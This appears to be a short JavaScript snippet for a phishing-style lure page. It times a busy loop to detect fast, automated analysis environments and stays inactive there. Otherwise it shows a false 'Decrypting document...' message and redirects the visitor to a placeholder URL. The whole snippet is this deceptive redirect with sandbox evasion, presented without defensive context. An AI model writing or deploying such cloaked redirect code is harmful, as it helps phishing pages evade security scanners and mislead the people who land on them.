const nextHop = "https://example.invalid/view";
function allowed() {
  var started = performance.now();
  for (var i = 0; i < 1e5; i++) Math.sqrt(i);
  if (performance.now() - started < 0.5) return false;
  return true;
}
if (allowed()) {
  document.getElementById('status').textContent = "Decrypting document...";
  setTimeout(function(){window.location.replace(nextHop)}, 400);
}
